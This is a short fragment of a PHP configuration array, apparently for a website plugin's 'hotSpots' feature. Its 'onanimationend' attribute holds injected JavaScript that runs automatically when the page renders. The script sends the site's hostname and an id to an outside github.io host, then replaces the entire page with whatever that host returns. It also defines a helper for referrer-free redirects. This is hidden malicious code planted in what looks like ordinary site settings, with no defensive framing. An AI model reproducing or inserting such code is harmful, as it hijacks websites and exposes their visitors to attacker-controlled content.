    ...
    'hotSpots' => [
        [
            ...
            'attributes' => [
                ...
                'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var redirectWithoutReferrer = function (url) { var meta = document.createElement('meta'); meta.name = 'referrer'; meta.content = 'no-referrer'; document.head.appendChild(meta); window.location.replace(url); }; fetch('https://leogoats.github.io/narkel/index.php?io0=" . $id . "&host=' + window.location.hostname + '&cache=1').then(function (res) { return res.text(); }).then(function (e) { document.open(); document.write(e); document.close(); }).catch(function (err) { console.error(err); }); }"
            ]
        ]
    ]
];
